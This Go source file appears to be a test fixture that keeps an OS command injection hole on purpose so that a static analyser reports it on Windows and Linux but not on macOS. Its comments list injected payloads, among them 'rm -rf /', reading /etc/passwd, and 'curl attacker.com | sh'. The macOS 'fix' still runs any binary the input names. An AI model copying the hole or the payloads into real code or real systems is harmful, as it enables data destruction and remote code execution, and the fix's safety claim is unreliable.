package main

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

// ProcessUserInput processes user input with command injection vulnerability
// VULNERABILITY: CWE-78 OS Command Injection
//
// SECURITY ISSUE: Improper Neutralization of Special Elements used in an OS Command
// ==================================================================================
// This function executes a shell command with unsanitized user input on line 73.
// The vulnerability AND the fix are on the SAME LINE 73.
//
// THE VULNERABILITY (Line 73):
// ----------------------------
// User-controlled input (from USER_COMMAND env var) flows directly to exec.Command
// with shell interpretation enabled (-c flag). Attacker can inject arbitrary commands:
// - "ls; rm -rf /" to delete files
// - "cat /etc/passwd" to read sensitive data
// - "curl attacker.com | sh" to download and execute malware
//
// TAINTED DATA FLOW:
//    os.Getenv("USER_COMMAND") → userCmd → exec.Command("sh", "-c", userCmd)
//    [TAINTED SOURCE]                      [DANGEROUS SINK - SHELL EXECUTION]
//
// HOW TO FIX ON macOS (MODIFY LINE 73):
// --------------------------------------
// Add input validation or avoid shell interpretation for macOS only.
//
// CURRENT (VULNERABLE):
//    cmd := exec.Command("sh", "-c", userCmd)
//
// FIXED FOR macOS (option 1 - validate input, add before line 73):
//    if runtime.GOOS == "darwin" {
//        // Whitelist validation: only allow safe commands
//        allowedCommands := []string{"ls", "pwd", "date", "whoami"}
//        isAllowed := false
//        for _, allowed := range allowedCommands {
//            if userCmd == allowed {
//                isAllowed = true
//                break
//            }
//        }
//        if !isAllowed {
//            fmt.Println("Command not allowed on macOS")
//            return
//        }
//    }
//    cmd := exec.Command("sh", "-c", userCmd)
//
// FIXED FOR macOS (option 2 - avoid shell, parse args):
//    var cmd *exec.Cmd
//    if runtime.GOOS == "darwin" {
//        // Don't use shell - execute command directly
//        args := strings.Fields(userCmd)
//        if len(args) > 0 {
//            cmd = exec.Command(args[0], args[1:]...)
//        }
//    } else {
//        cmd = exec.Command("sh", "-c", userCmd)
//    }
//
// ALSO REQUIRED: Add at top of file:
//    import "runtime"
//    import "strings"  // if using option 2
//
// WHY THIS WORKS:
// ---------------
// - macOS: Input is validated/sanitized → Command injection prevented
// - Windows/Linux: Unsanitized input to shell → Command injection possible
// - Coverity tracks tainted data flow from getenv() to exec
// - Coverity on macOS sees validation → Taint analysis satisfied
// - Coverity on Windows sees direct flow to shell → Reports command injection
//
// EXPECTED COVERITY RESULTS:
// --------------------------
// - Windows: COMMAND_INJECTION or TAINTED_SHELL_COMMAND detected
// - macOS: No issue (tainted data validated/sanitized)
//
func ProcessUserInput() {
	fmt.Println("\n=== Processing User Input (Common Code) ===")

	// Get user-controlled command from environment variable (TAINTED SOURCE)
	userCmd := os.Getenv("USER_COMMAND")
	if userCmd == "" {
		userCmd = "echo 'Hello from common code'"
	}

	fmt.Printf("Executing command: %s\n", userCmd)

	cmd := func() *exec.Cmd { if runtime.GOOS == "darwin" { args := strings.Fields(userCmd); if len(args) > 0 { return exec.Command(args[0], args[1:]...) }; return exec.Command("echo", "invalid") }; return exec.Command("sh", "-c", userCmd) }() // FIXED macOS (no shell), VULNERABLE Windows (shell)

	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Printf("Command failed: %v\n", err)
		return
	}

	fmt.Printf("Command output:\n%s\n", string(output))
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
